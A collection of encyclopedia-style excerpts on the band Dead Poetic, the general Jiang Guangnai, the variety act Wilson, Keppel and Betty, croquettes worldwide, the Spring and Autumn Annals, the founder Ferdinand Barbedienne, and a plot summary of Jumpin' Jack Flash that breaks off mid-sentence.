Their most recent lineup consisted of vocalist Brandon Rike, guitarist Zach Miles, and drummer Jesse Sprinkle. They released three albums and a greatest hits album, The Finest, on Tooth & Nail Records. The band lapsed into inactivity in 2007 due to internal strife and inability to tour, though Rike has stated that the band plans to record a fourth album. Band history =Formation= Dead Poetic was first formed when members Zach Miles, Brandon Rike, and Chad Shellabarger were at the age of 13. Josh Shellabarger was then 15. The band formed in their local Church, and each taught themselves. Their first show was at the three teenagers' Middle School's annual \\"Talent Show.\\" The band went by the name MindSet, before changing it to Ded Poetic. Later they changed the name to Dead Poetic. =1997‚Äì2002= The band first garnered attention in the underground music scene following the release of their first full-length record Four Wall Blackmail, which was released by Tooth & Nail subsidiary Solid State Records, and single \\"August Winterman.\\" Their second release, 2004's New Medicines, heightened the band's profile considerably, however. Produced by Aaron Sprinkle (Emery, Acceptance), the album's sales were buoyed by the title track, which became a hit on MTV2 and Fuse TV. On these first two albums, music critics had a hard time classifying the band's music: genres from emo to post-hardcore to alternative rock were all tossed around with little consensus. =2002‚ÄìMid 2004= After the release of New Medicines, Dead Poetic went on tour in support of Demon Hunter in the fall of 2004 and essentially imploded shortly thereafter. Personal disagreements within the band caused bassist Chad Shellabarger, drummer Josh Shellabarger, and guitarist Todd Osborn to all depart the band, and Dead Poetic appeared to be a thing of the past. But remaining members Brandon Rike (vocals) and Zach Miles (guitar) began playing with accomplished drummer Jesse Sprinkle (formerly of Poor Old Lu and Demon Hunter; also the brother of producer Aaron Sprinkle) and their passion for music reignited. Beloved alums Dusty Redmon (guitar) and John Brehm (bass) came on board to round out the new, revamped version of Dead Poetic. =2004‚ÄìLate 2006= For their third album, Vices, the band once again enlisted Aaron Sprinkle to produce the album, but this time, the band eschewed the screaming that had been one of the hallmarks of their earlier style. In an interview with CCM Magazine, Rike said, \\"There is no way I could get myself to scream on a song anymore. I'm just past it.\\".Thompson, John J. \\"A New Lease on Life\\", CCM Magazine, volume 29, Issue 1, July 2006, p.11. Though originally scheduled for a July 18 release, the release date for Vices was pushed back to October 31, with \\"Narcotic\\" chosen as the lead single. Dead Poetic was scheduled to tour with The Red Jumpsuit Apparatus in fall 2007, but backed out of those dates in mid-October 2006. On November 25, 2006, Absolutepunk.net reported that Brandon Rike had left Dead Poetic and the remaining members had decided not to continue with the band. Though the band initially posted a message on their MySpace page in December 2006 stating they were still active, most fans eventually assumed the band had indeed broken up because of the band's noticeable lack of touring. Guitarist Dusty Redmon confirmed the band's disbanding on absolutepunk.net in September 2007: \\"When Brandon left the band back in October (before \\"Vices\\" came out), a lot of big stuff was going on. We had great tour plans, a batch of new songs we were in to, and just kind of a new sense of freshness about the band. Brandon had been sort of \\"over it\\" for a long time, and just sort of picked a bad time to bail. He loves doing design, and being hang-out-at-home-type of husband, which is cool. I kind of called \\"NOT IT\\" when it came to making an announcement, but I guess so did everyone else. T&N; put a lot of initial money into the record, only to see the band fall apart before the release, causing them to basically drop the entire promotion campaign. Sorry to those who were led on by thinking we were still active. Jesse is recording, Brandon is designing, John is tattooing, Zach just had a new baby, and I'm playing in The Almost.\\" =December 2006‚Äì2015= Dead Poetic has stated that they plan to continue writing music, and to fulfill their existing contract with Tooth & Nail Records; such plans have gone unfulfilled, however. On October 30, 2007, Jesse Sprinkle posted a MySpace bulletin reiterating that the band was still indeed together. \\"Contrary to popular opinion and the mighty Wikipedia, Dead Poetic has not broken up. We are still a band indeed....we figured we'd post it to the public....we assure you that Dead Poetic is alive.\\" He went on to say that the band's label, Tooth and Nail, would be releasing a \\"Best Of\\" album for Dead Poetic in the near future, and that the band hopes to start writing songs for a new record very soon. The \\"Best Of\\" album was since released, but despite all such claims of producing new music, the band has remained inactive since. On November 16, 2007, Brandon Rike posted a blog on MySpace that contained a long description, written by Brandon Rike himself, on why it's been so hard to keep the band together. In the blog, Rike focused on issues such as his marriage, Dusty Redmon playing for The Almost, tours that they missed, among other things. He also mentioned that their best-of album, The Finest hits stores on November 20, 2007. In this blog, Rike stated that Miles, Sprinkle, and himself had plans to record a new album after The Finest without any plans of going on tour. As of November 16, 2007, this announcement could be viewed at www.deadpoetic.com underneath the banner which reads \\"DEAD POETIC IS NOT DEAD.\\" As of October 20, 2008, Dead Poetic had been removed from the artists list on the official website of Tooth & Nail Records. Inside the cover of their newest album The Finest, Brandon Rike made a statement that the band would no longer be touring so he could stay home with his wife, and that the band was planning on releasing one more album. Despite these claims, the band has not released any public statements since 2008 and remained inactive. As of April 2009, the Dead Poetic website had been taken down and redirected to the band's MySpace page. In a 2015 podcast, Brandon Rike confirmed that Dead Poetic has no intentions to reform or release any new music at this time.

Defense of Shanghai He became a bodyguard to Sun Yat- sen and, in 1932, was promoted to general and Commander in Chief of the 19th Route Army, leading it in the successful defense of Shanghai against Japanese invasion in the January 28 incident. Fujian Incident After the cease-fire was brokered, the 19th Army was reassigned by Chiang Kai-shek to suppress Chinese Communist insurrection in Fujian. It won some battles against the Communists but then negotiated peace with them. Jiang Guangnai joined an insurrection that, on 22 November 1933, established a new People's Revolutionary Government of the Republic of China (), free from the control of Chiang's Nanjing government. The new Fujian government was not supported by other warlords or by all elements of the communists and was quickly crushed by Chiang's armies in January 1934. Jiang escaped with his family to Hong Kong and the rest of the army was disbanded and reassigned into other units of the National Revolutionary Army. World War II During the Second Sino-Japanese War from 1939 to 1944 he returned to become Deputy Commander in Chief of the 4th War Area and in 1945 Deputy Commander in Chief of the 7th War Area. Later years After the Chinese Civil War, Mao assigned Jiang to be Minister of Textiles of the new People's Republic of China from 1950. Most high-ranking officials struggled with the Red Guards during the Cultural Revolution. Jiang, however, was saved by Zhou Enlai. Zhou carefully and cleverly arranged for Jiang to join him and Mao Zedong on Tiananmen to inspect the Red Guards, some of whom had just stormed Jiang's home the previous day. During the inspection Jiang was positioned almost next to Mao.

They capitalised on the fashion for Ancient Egyptian imagery following the discovery of the tomb of Tutankhamun. The \\"sand dance\\" that formed the highlight of their act was a parody of postures from Egyptian tomb paintings, combined with references to Arabic costume. The lithe and extremely lanky Wilson and Keppel, who wore long moustaches and make-up to emphasise the sharp angularity of their features and make them appear almost identical, demonstrated their impressive suppleness in adopting wild gestures and dancing in identical \\"stereo\\" movements, while Betty joined their antics. The act included a soft-shoe routine performed on a layer of sand spread on the stage to create a rhythmic scratching with their shuffling feet and was usually performed to the familiar Egyptian Ballet (1875), by Alexandre Luigini. Early careers Wilson, Keppel and Betty photographed in 1928 Jack Wilson (30 January 1894 ‚Äì 29 August 1970) was born in Warrington in Lancashire as John William Wilson, the son of a tanner; on leaving school Jack also worked as a tanner. During World War I Wilson served with the Royal Navy following which he travelled to Australia, where he joined Colleano's Circus in 1920.Alan Stafford, Wilson, Keppel and Betty: Too Naked for the Nazis ‚Äì Fantom Publishing (2015) p.17 Joe Keppel (5 May 1894 ‚Äì 14 June 1977) was born in County Cork in Ireland as John Joseph Keppel. In 1912 he joined the Royal Navy, but was discharged after 5 months as being unfit. After making his way to Australia he joined the Royal Australian Navy in 1914 and was discharged as unfit after almost two years. On travelling to Australia he also joined Colleano's Circus, where he teamed up with Jack Wilson.Stafford, p.17 Betty joins the act In 1920 the duo travelled to Canada where they toured in a comedy tap dancing act, later also performing in vaudeville venues in the United States. By 1928 they were performing as 'The Bus Boys'Stafford, p.44 and in this year Kansas-born chorus girl Betty Knox (Alice Elizabeth Peden, 10 May 1906‚Äì25 January 1963) joined the act at Des Moines, Iowa. She is said to have married mechanic Donald Knox in 1923 and to have divorced him after a brief marriage, but there are no records to confirm either event. Their daughter Jean Patricia Knox was born in 1923 in Salina, Kansas.Stafford, p.29 She was to be brought up by her grandparents for the next 14 years while her mother worked firstly in a chorus line and then with Wilson and Keppel.Stafford, p.42 International celebrity Betty Knox (third from right) in 1944 as a war correspondent for the London Evening Standard The act came to Britain to appear at the London Palladium for a few weeks in 1932 and stayed permanently. Over the years there were between 8 and 12 'Bettys', most of these appearing during the act's later years: Betty Knox retired from the act in 1941 to go into journalism, becoming a war correspondent during the Second World War, and reporting on the Nuremberg trials for three years as a correspondent for the London Evening Standard. She was among the first to report the suicide of Hermann G√∂ring. Wilson and Keppel perform their Sand Dance routine in 1934 Their \\"Cleopatra's Nightmare\\" routine was performed in 1936 in Berlin and condemned by Joseph Goebbels as indecent. In the UK they were regarded as one of the best 'speciality acts' ‚Äì acts designed to balance and support the star of a variety programme. Typically these acts would last about ten minutes, and be repeated twelve times a week (matinee and evening performance, every day except Sunday) in variety theatres all over the country. A fine example of the \\"Cleopatra's Nightmare\\" routine can be seen in the Harold Baim film Starlight Serenade. Knox's daughter, Patsy Knox, took over as 'Betty' in 1942, staying with the act until 1950. The trio, in its various line-ups, appeared at the Royal Variety Performance in 1933, 1945 and 1947. In 1950 they appeared at the London Palladium on the same bill as Frank Sinatra. They toured all over the world, performing at shows in London, Europe, India, America, the Far East and Near East, Australia, Scandinavia and South Africa. They finally retired in 1962 after a performance in Great Yarmouth. Betty Knox died in 1963 at her home in D√ºsseldorf in Germany, where she had lived since the end of World War II. Jack Wilson moved into Brinsworth House, a retirement home for showbusiness personalities, where he died in 1970. Joe Keppel died in St Finbars Hospital in his native Cork in Ireland in 1977. Patsy Knox died in 1984 in Pearland, Texas, USA.Stafford, p.232 Legacy A pop art sculpture of the trio, The Sand Dancers made by Nicholas Monro for the Sands Hotel, Edinburgh, is now part of the Treadwell Collection. A simplified rendition of their sand dance was performed by Matt Berry and Harry Peacock in the 'Bob a Job' episode of Toast of London, broadcast on 9 December 2015. Steve Martin's \\"Funky Tut\\" routine, broadcast on \\"Saturday Night Live\\" on 22 April 1978, owes much to their sand dance. The trio's first biography, Wilson, Keppel and Betty: Too Naked for the Nazis by Alan Stafford, was published by Fantom Publishing in 2015. The book won the Bookseller/Diagram Prize for Oddest Title of the Year 2016.Onwuemezi, Natasha (February 25, 2016) Too Naked for the Nazis claims 38th Diagram Prize The Bookseller Other Bettys George Melly, the celebrated jazz vocalist is quoted in his biography as saying \\"There were several Bettys, they would get rid of one after about 10 years.\\" Melly was mistaken in this as each dancer was part of the act for years or was on a short term contract; all agreed, however, that Wilson and Keppel were a joy to work with.Stafford, p.237 In addition to Betty (1928‚Äì1941) and Patsy Knox (1942‚Äì1950), the Bettys included Edna May Lark (who once stood in for Patsy Knox), Jean Bamberger (1933), Eunice Roberts (1941), Barbara Holt (1951), Iren√© Edwin-Scott (1951‚Äì54), Mary Wemys (who appeared in the act in Las Vegas in 1954), Valerie Cottrell (1955‚Äì56), Maureen Drew (1956 and the first Betty to appear on television), and Jean McKinnon, who took over in 1956 and was the last Betty when the act broke up in 1962.

The binder is typically a thick b√©chamel or brown sauce, or mashed potatoes. The binder may be mixed with a filling or may be stuffed with it; this mixture is called a salpicon. Typical fillings include finely chopped meat, seafood, cheese, rice, pasta, or various vegetables as well as seasonings such as spices, herbs, and mushrooms. Sweet croquettes may use a pastry cream binder and be filled with fruit.Prosper Montagn√©, Larousse gastronomique: the encyclopedia of food, wine & cookery, Crown, 1961. (translation of the 1938 edition) , s.v., p. 325 Croquettes may also be formed in other shapes: disks, ovals, balls. Etymology The word croquette is French, derived from croquer 'to crunch'. In the 18th century, it was usually spelled croquet.Alan Davidson, Oxford Companion to Food, 1999, s.v., p. 229 Origins A 17th-century recipe for croquettes (croquets) by Fran√ßois Massialot binds a filling of meat, truffles, marrow, bread crumbs, and cheese with egg, then breads and fries them in lard. They may be as large as an egg or as a walnut, and can be served as an hors-d'≈ìuvre or as a garnish.Fran√ßois Massialot, Le Cuisinier royal et bourgeois, Paris, 1693, p. 227 They are mentioned in a 1706 English dictionary.Edward Phillips, The New World of Words: or, Universal English Dictionary, 7th ed., London 1720, s.v. One 18th-century recipe uses just a batter, not a b√©chamel binder.Menon (pseud.), La cuisini√®re bourgeoise, 1769, p. 42 Croquettes of the modern type, with a thick binder, are documented in an 1822 English cookbook by the French cook Louis Eustache Ude.Louis Eustache Ude, The French Cook, 1822, p. 208 Asia Croquettes with red lettuce.jpgCircular croquettes Kartoffel- Kroketten-tiefgefroren.jpgCylindrical potato croquettes Croquetas con patatas fritas.JPGCroquetas fritas DSC 0082 broodje kroket chiang mai 2009 0629.jpgTwo Dutch kroketten, one cut open to show the beef-ragout filling; Chiang Mai, Thailand =Indian subcontinent= mint and tamarind sauce and dahi (yogurt) in India. A potato-filled croquette called aloo tikki, which originated in the Indian subcontinent, is very popular in northern India and is typically served with a stew. They are mostly eaten as snacks at home and are also popularly sold by road-side vendors. In West Bengal, it is called vegetable chop. Sometimes it is called a \\"cutlet\\" and eaten plain or as a fast-food variation that is served inside a hamburger bun (like a vegetarian burger). Meat croquettes called kababs are made with minced mutton. Lightly spiced beef croquettes are a popular snack and appetiser among the Christian communities in Goa and Kerala. Goan croquettes recipe =China and Taiwan= In China and Taiwan, croquette was called Y√π n√≠ kƒõl√® b«êng (ËäãÊ≥•ÂèØÊ®ÇÈ§Ö), made from taro. =Indonesia= The kroket (Dutch) made of mashed potato filled with minced chicken or ragout is one of the most popular snack items in Indonesia, introduced during the Dutch colonial rule. The kroket is made by putting chicken filling inside a mashed potato ball which is then breaded and fried. =Japan= A relative of the croquette, known as korokke,Hara, Reiko (2006) International Cuisine: Japan . („Ç≥„É≠„ÉÉ„Ç±) is a very popular fried food, widely available in supermarkets, convenience stores and butcher shops, as well as from specialty korokke shops. Generally patty-shaped, it is mainly made of potatoes with some other ingredients such as vegetables (such as onions and carrots) and maybe less than 5% meat (e.g. pork or beef). It is often served with tonkatsu („Å®„Çì„Åã„Å§) sauce. Cylinder-shaped korokke are also served which more closely resemble the French version, where seafood (prawns or crab meat) or chicken in white sauce (ragout) is cooled down to make it harden before the croquette is breaded and deep-fried. When it is served hot, the inside melts. This version is called \\"cream korokke\\" („ÇØ„É™„Éº„É†„Ç≥„É≠„ÉÉ„Ç±) to distinguish it from the potato-based variety. It is often served with no sauce or tomato sauce. Unlike its French cousin, croquettes made mainly of meat are not called korokke in Japan. They are called menchi katsu („É°„É≥„ÉÅ„Ç´„ÉÑ), short for minced meat cutlets. =South Korea= Usually called goroke (Í≥†Î°úÏºÄ) or keuroket (ÌÅ¨Î°úÏºì),KBS, Busan (2005) it is a food sold in most bread shops in Korea. The most common type is deep-fried rolls stuffed with japchae (Ïû°Ï±Ñ) ingredients or chicken curry and mashed potato with vegetable salad. Also, goroke are sometimes filled with kimchi, pork, and bulgogi ingredients. Many Korean stores often advertise the goroke as a French product and they are usually sold in most European-style bread stores all over Korea.  Europe  =Belgium= Almost every restaurant offers kroketten/croquettes as a side dish, and when served this way, they always mean the variety filled with mashed potatoes. As the ubiquitous main dish in Belgian restaurants, croquettes are completely different from the potato filled variety served as a simple side dish. The two most popular traditional Belgian croquettes have a thick and creamy bechamel filling mixed with grey shrimps \\"garnaalkroketten/croquettes de crevettes\\" or cheese \\"kaaskroketten/croquettes de fromage\\". Most menus offer both either as a starter or a main course. As a main dish they are usually served with a salad, fried parsley and frites. More adventurous chefs have experimented with the classic formula, adding endives, asparagus, goat's cheese or beer to their fillings =France= The ragout-filled dish was regarded as a French cuisine delicacy, first described in a recipe from 1691 by the chef of the French king Louis XIV and using ingredients such as truffles, sweetbreads, and cream cheese. From the 1800s onwards, it became a way to use up leftover stewed meat. =Germany, Austria, and Switzerland= Baked croquettes from Austria Plain potato croquettes are served as a side dish in restaurants and are also available frozen in supermarkets. They are usually called Kroketten (singular Krokette). =Hungary= Krokett is a small cylindrical croquette similar to the Czech variety: potatoes, eggs, flour, and butter, seasoned with nutmeg and salt and deep-fried in oil. This variety can be ordered in most restaurants as a side dish, and also bought frozen. When made with cottage cheese, they are called t√∫r√≥krokett.Turokrokett =Italy= In Italy, crocchette (known in the South as crocch√®) are made mainly with crushed potatoes or vegetables, like aubergines (crocchette di melanzane). Rice arancini (typical of Sicily), suppl√¨ (Roman cuisine) and Milanese rice and saffron croquettes are particularly well known in Italian cuisine. In Emilia Romagna and Piemonte croquettes are usually filled with chicken meat, while in Calabria polpette di riso are stuffed with rice and cheese (usually Parmesan or Pecorino). =Ireland= Plain potato croquettes are available frozen or refrigerated in most supermarkets. They are also homemade, usually with the addition of chopped onion. =Netherlands= A kalfsvleeskroket, Dutch croquette containing a veal ragout After World War II, several suppliers started mass- producing croquettes filled with beef. The croquette (kroket in Dutch) subsequently became even more popular as a fast food; meat ragout covered in breadcrumbs which is subsequently deep-fried. Its success as a fast food garnered its reputation as a cheap dish of dubious quality, to such an extent that Dutch tongue in cheek urban myths relate its \\"allegedly mysterious content\\" to offal and butchering waste.H. van Dam: Het volkomen krokettenboek, publisher: Nigh & Van Ditmar, 2011 Research in 2008 showed that 350 million kroketten are eaten in the Netherlands every year. An estimated 75% of all Dutch people eat them, resulting in 29 kroketten per person per year on average, being the 2nd most popular Dutch snack after the frikandel. The major consumers are between 35 and 49 years old. The success of the croquette led to a whole series of food products resembling the croquette, but with other types of fillings, such as noodles, rice and kidney, and with names like bamibal, nasibal, and nierbroodje instead of croquette. Variants of the croquette which specify the kind of meat can also be found, like rundvleeskroket (made with beef) and kalfsvleeskroket (made with veal). Also popular in Dutch snack bars are the sat√©kroket (where the filling consists of a peanut satay sauce and shredded meat in a ragout) and the goulashkroket. A smaller round version of the standard beef or veal croquette, the bitterbal, is often served with mustard as a snack in bars and at receptions. Potato croquettes and potato balls (similar to potato croquettes, but small and round) can be bought frozen in most food stores. ', a croquette on a bread roll, is sold in restaurants, snack shops, and even by street vendors. The popularity of the kroket in the Netherlands is such that even McDonald's sells their version on a bun as \\"McKroket\\". =Poland= Polish croquettes, served with barszcz (borscht soup) Croquettes in Poland are typically made from a thin, rolled crepe-type pancake stuffed with meat, mushrooms, cabbage, sauerkraut, or some combinations of those ingredients. The croquette is lightly pan fried before serving. Some recipe variations also require the croquette to be covered in breadcrumbs before frying, and served with a clear soup e.g. \\"barszcz\\", similar to borscht. =Portugal= Croquetes are cylindrical, covered in breadcrumbs, and deep-fried. They are usually made with white sauce and beef, sometimes mixed with varying amounts of pork, and frequently with some chouri√ßo, black pepper or piri-piri to add more flavour. Seafood, fish (other than codfish) and vegetarian (potato) croquetes are also eaten in Portugal, but those have other names (such as rissol, pastel, empada), thus the name croquete refers only to the Dutch-style beef croquette. =Russia= The widespread minced cutlet ()russianfoods is made of minced meat (beef or pork or mixture of both, chicken, turkey, or fish), bread, eggs, white onions, salt and spices, shaped as a meat patty and pan fried. Bread is added in amount up to 25% of meat, adding softness to the final product and also making it cheaper to produce. The Pozharsky cutlet is a well-known variety of such cutlets in which minced meat is mixed with butter. =Spain= Traditional croquetas in Spain are made with thick b√©chamel. They are one of the most typical tapas dishes, especially filled with jam√≥n, chicken or saltcod. Also, many bars and restaurants may offer novel, less traditional versions of croquettes with more varied fillings and ingredients such as apple, wild mushrooms, morcilla (blood sausage), cheeses, tuna, cuttlefish (using its ink to give color and flavour), etc. Croqueter√≠as are restaurants that specialize in croquetas. =United Kingdom= Croquettescroquette are available frozen or refrigerated in most supermarkets, typically with potato filling. Caribbean =Puerto Rico= Croquettes are typically made out of ham, codfish or chicken in Puerto Rico, where they are dipped in what is colloquially known as \\"mayo-ketchup\\", a variation of fry sauce. Frozen croquettes are sold in supermarkets in Puerto Rico. =Cuba= Cuban croquettes are nearly identical to the Puerto Rican croquettes that are typically made out of ham or chicken, but the Cuban croquette is much more popular. Not only that, but there is a common cheese and potato variation, and they are sometimes made with fish. = Dominican Republic = Dominican croquettes are nearly identical to the Cuban croquettes that are typically made out of ham or chicken, but there is a common cheese and potato variation, a beef variation and they are also sometimes made with fish. = Aruba = Aruban croquettes are more commonly made out of mashed potato, ground beef, shellfish, and fish. They are eaten as an early morning breakfast or as snacks any time of the day. They are considered as one of the island's cultural foods. North America =Mexico= Croquettes are usually made of tuna or chicken and potatoes. In southern Mexico, a variety is made with fresh cheese, plantain, and black beans. =United States= \\"Boardwalk\\" fish cakes and crab cakes, eaten on the east coast of the United States, are essentially croquettes. They consist, respectively, of chopped fish or crab meat, mixed in a buttery dough which is then breaded and deep-fried. A deviled crab (croqueta de jaiba) is a particular variety of a blue crab croquette from Tampa, Florida. The crab meat is seasoned with a unique Cuban-style enchilada or sofrito sauce (locally known as chilau), breaded with stale Cuban bread crumbs, formed into the approximate shape of a prolate spheroid, and fried. It is meant to be eaten with one hand. It originated in the immigrant community of Ybor City during a cigar workers' strike in the 1920s\\"Bitter Strikes Brought Deviled Crabs\\" - Cigar City Magazine \\"A venerable Tampa tradition\\" - foodmuseum.com and is still very popular in the area. Other types of crab and fish croquettes are made throughout the southern U.S., especially in coastal states such as Louisiana where seafood dishes are common staples. These varieties have different seasonings and shapes, with some served inside the scooped-out shell of the crab. A traditional New England/Northeastern United States preparation uses ham, usually of the maple-cured variety, along with cooked mashed potato (often mixed with some mild seasonings and milk or butter for a smoother consistency) for the outer roll. These are dipped in crumbed breading, and saut√©ed or fried in a small skillet using butter. Typically, these are most common during the Thanksgiving-to-Christmas holiday season as one of several ways to use up leftover holiday ham. Another croquette dish popular across much of the American South is salmon croquettes. Any canned fish - usually salmon or mackerel, although canned tuna is also used in some recipes (although the dish is often colloquially referred to as \\"salmon croquettes\\" or \\"salmon patties\\" regardless of the actual fish used) - is mashed by hand to break up any fish bones and give the fish meat a smoother consistency, then combined with a binder and various seasonings. Seasonings typically include pepper, salt, chopped (sometimes saut√©ed) onions, garlic, lemon juice or paprika. The binder can be any starch such as flour, cornmeal, ground crackers of any type, even white rice, matzo meal, or oatmeal - although these latter variations are not as common, and are mostly limited to the northern U.S. Chopped eggs, parsley, and Parmesan cheese may also be added. The mixture is then shaped into rounded patties for pan- or deep- frying; corn or peanut oil are the most commonly used frying oils in the southern U.S., but canola, safflower, or olive oil are also used, and some recipes call specifically for pan-frying in butter or margarine. South America =Brazil= Croquetes, primarily made from beef, are common in many parts of Brazil. The coxinha is a popular chicken-based croquette, intentionally shaped to look like a chicken thigh. =Ecuador= From Riobamba llapingachos are potato cakes with a cheese filling, fried in oil with achiote and served with a peanut sauce. = Uruguay = Called \\"croquetas\\" in Spanish, the most popular stuffings are mashed potatoes (croquetas de papa), ham and mozzarella cheese (croquetas de jam√≥n y queso), and rice (croquetas de arroz). Sometimes, the rice ones have herbs and little ham cubes. Generally, their shape is cylindrical and they're medium-sized, but bigger, spherical ones also can be seen (specially with rice stuffing). They are deep-fried in oil. The average Uruguayan eats them usually with mayonnaise or ketchup. Croquetas are very common: they can be bought in almost every bakery, supermarket or food shop, and a lot of people cook them at home as a side dish or even main dish. In modern restaurants, more sophisticated croquettes (e.g. with serrano ham and mixture of cheeses, or with salmon) usually come with a more elaborated sauce as dip (e.g. sweet chili sauce), and are ordered as starters (reason why those ones tend to be smaller in size). = Colombia = In Colombia croquettes are commonly referred to as \\"papa rellena\\", which translates as stuffed potato. They consist of a mix of roughly mashed potato, seasoned shredded or ground beef and an egg to bind the mix, which is then lightly battered and deep fried. They are served in bars and casual restaurants, as well as often being served at home for a celebration or party. They are usually served with a side of homemade or bottled chilli sauce.

The Annals records main events that occurred in Lu during each year, such as the accessions, marriages, deaths, and funerals of rulers, battles fought, sacrificial rituals observed, celestial phenomena considered ritually important, and natural disasters. The entries are tersely written, averaging only 10 characters per entry, and contain no elaboration on events or recording of speeches. During the Warring States period (475221), a number of commentaries to the Annals were created that attempted to elaborate on or find deeper meaning in the brief entries in the Annals. The Commentary of Zuo (Zuo zhuan Â∑¶ÂÇ≥), the best known of these commentaries, became a classic in its own right, and is the source of more Chinese sayings and idioms than any other classical work. History and content The Spring and Autumn Annals was likely composed in the 5th century BC, and apart from the Bamboo Annals is the only such work to have survived from that period. By the time of Confucius, in the 6th century BC, the term \\"springs and autumns\\" (ch≈´nqi≈´ , Old Chinese *t ∞un ts ∞iw) had come to mean \\"year\\" and was probably becoming a generic term for \\"annals\\" or \\"scribal records\\". The Annals was not the only work of its kind, as many other Eastern Zhou states also kept annals in their archives. The Annals is a succinct scribal record, with terse entries that record events such as the accessions, marriages, deaths, and funerals of rulers, battles fought, sacrificial records observed, natural disasters, and celestial phenomena believed to be of ritual significance. The entries average only 10 characters in length; the longest entry in the entire work is only 47 characters long, and a number of the entries are only a single character long. There are 11 entries that read simply *tung (), meaning \\"a plague of insects\\" (probably locusts). Some modern scholars have questioned whether the entries were ever originally intended as a chronicle for human readers, and have suggested that the Annals entries may have been intended as \\"ritual messages directed primarily to the ancestral spirits.\\" Commentaries Since the text of this book is terse and its contents limited, a number of commentaries were composed to explain and expand on its meanings. The Book of Han vol. 30 lists five commentaries: * The Commentary of Zou (ÈÑíÊ∞èÂÇ≥) * The Commentary of Jia (Â§æÊ∞èÂÇ≥) * The Commentary of Gongyang (ÂÖ¨ÁæäÂÇ≥) * The Commentary of Guliang (Ê¶ñÊ¢ÅÂÇ≥) * The Commentary of Zuo (Â∑¶Ê∞èÂÇ≥) (also known as Â∑¶Ê∞èÊò•Áßã) No text of the Zou or Jia commentaries has survived. The surviving commentaries are known collectively as the Three Commentaries on the Spring and Autumn Annals. The Gongyang and Guliang commentaries were compiled during the 2nd century BC, although modern scholars had suggested they probably incorporate earlier written and oral traditions of explanation from the period of Warring States. They are based upon different editions of the Spring and Autumn Annals, and are phrased as questions and answers. The Commentary of Zuo, also known as the Zuo Zhuan, composed in the early 4th century BC, is a general history covering the period from 722 to 468 BC which follows the succession of the rulers of the State of Lu. Modern scholars disagree about whether it is truly a commentary on the Spring and Autumn Annals or an independent work. In any case, scholars have found it by far the most useful among the three surviving 'commentaries' both as a historical source for the period and as a guide to interpreting the Annals. Influence The Annals is one of the core Chinese classics and had an enormous influence on Chinese intellectual discourse for nearly 2500 years. This was due to Mencius' assertion in the 4th century that Confucius himself edited the Annals, an assertion which was accepted by the entire Chinese scholarly tradition and went almost entirely unchallenged until the early 20th century. The Annals' terse style was interpreted as Confucius' deliberate attempt to convey \\"lofty principles in subtle words\\" (wƒìiy√°n d√†y√¨ ÂæÆË®ÄÂ§ßÁæ©). Not all scholars accepted this explanation: Tang dynasty historiographer Liu Zhiji believed the Commentary of Zuo was far superior to the Annals, and Song dynasty prime minister Wang Anshi famously dismissed the Annals as \\"a fragmentary court gazette (du√†nl√†n ch√°ob√†o )\\". Many Western scholars have given similar evaluations: the French sinologist √âdouard Chavannes referred to the Annals as \\"an arid and dead chronicle\\". The Annals have become so evocative of the era in which they were composed that it is now widely referred to as the Spring and Autumn period.

Career The son of a small farmer from Calvados, he started his career as a dealer in wallpaper in Paris. In 1838 he went into partnership with Achille Collas (1795-1859), who had just invented a machine to create miniature bronze replicas of statues. Together they started a business selling miniatures of antique statues from museums all over Europe, thus democratising art and making it more accessible to households.Information translated from Ferdinand Barbedienne entry in French Wiki From 1843 they extended their scope by reproducing the work of living artists and also diversified by making enamelled household objects. With the outbreak of the Franco-Prussian war in 1870 the firm briefly had to switch to cannon founding owing to the shortage of metals but resumed business afterwards. Following Barbedienne's death in 1892, he was buried in the P√®re- Lachaise cemetery and the firm was carried on by his nephew Gustave Leblanc until 1952.Information taken from the Bronze Gallery site Among the principal artists reproduced by the firm were Antoine Louis Barye and Auguste Rodin.

The film was directed by Penny Marshall in her theatrical film directorial debut. The soundtrack includes two versions of the song \\"Jumpin' Jack Flash\\": the original by the Rolling Stones, and a remake by Aretha Franklin heard over the end credits. Franklin's version was not included on the film's soundtrack album but was released as a single. Plot Terry Doolittle is a computer operator at a Manhattan bank. Though a good employee, well-liked by her co- workers, she is often chastised by her no-nonsense, imperious boss, James Page, who has little patience for Terry's unorthodox work ethics. One evening as the rest of the co-workers are saying goodbye to their friend, Jackie, who is going on maternity leave, Terry receives the message \\"Knock, Knock\\" on her screen and is contacted by a man calling himself Jumping Jack Flash, a British Intelligence agent in Eastern Europe who is being pursued by the KGB. Terry solves his riddles and determines his password is B-flat, the key in which \\"Jumpin' Jack Flash\\" is written. Jack sends her to the British Consulate to deliver a coded message to its Department C. Terry delivers the message to a man named Jeremy Talbot, who seems puzzled by her message and claims there is no Department C. The next night, Terry tells Jack of her encounter with Talbot and he is understandably concerned about the outcome. He asks her to go to his New York apartment to retrieve a frying pan, containing his CIA contacts, who will supply an exit strategy. Meanwhile, Marty Phillips joins the staff at the bank as Jackie's replacement. A computer technician comes to repair her terminal, but when Terry questions his identity, he vanishes. After arriving at Jack's apartment and retrieving the frying pan, she notices that someone had entered and taken her picture, which is pinned to the front door. Shaken, she runs back outside to her taxi, only to find the technician from earlier is the driver. She knocks him out with the frying pan and flees. Terry is unable to reach the first of four contacts on the frying pan, Peter Caen, but does reach Mark Van Meter, who meets her by the East River. He is stunned to learn of what has happened to Jack and that Terry is a civilian. As they continue to talk, Van Meter notices someone coming up behind them. He quickly pushes Terry into the river, just before he is shot dead. Terry attends Van Meter's funeral, where she meets Jack's second contact Archer Lincoln, as well as Liz Carlson, wife of third contact Harry Carlson. Lincoln dismisses Terry, but Liz informs her that Harry is with Jack. After talking with Jack that evening, Jack deduces Harry is dead, then asks Terry to break into the Consulate's computer. Terry gets the idea to use the Queen's Anniversary Ball being held there as a cover and goes there disguised as a singer. Conning her way in, she runs into Liz, who runs interference for her when Talbot intercepts her and manages to reach the computer room and secure a contact for Jack. But the next night, while Terry is sending it, Talbot deactivates the computer link before Jack receives his contact's name. Terry goes to Liz's home to talk to her, only to discover she and her children are gone and the house is empty and deserted. She hurries out, but is cornered by a strange man and ushered to a nearby limousine where Archer Lincoln is waiting for her. Inside the car, Lincoln confirms Harry Carlson's death and tells Terry that Liz and her children have been moved from their homes and given new identities for their own safety. He then warns her to break off contact with Jack to save her life. The following morning, Terry decides to try and contact Lady Sarah Billings, who is an old flame of Jack's and obtain a contact from Jack from her. While calling around for information from a nearby phone booth, Terry is abducted and literally dragged through the streets of Manhattan by a tow truck while still inside. She manages to escape only to be confronted by the technician from the previous nights and injected with truth serum. He manages to get a partial confession from her, but she traps him by 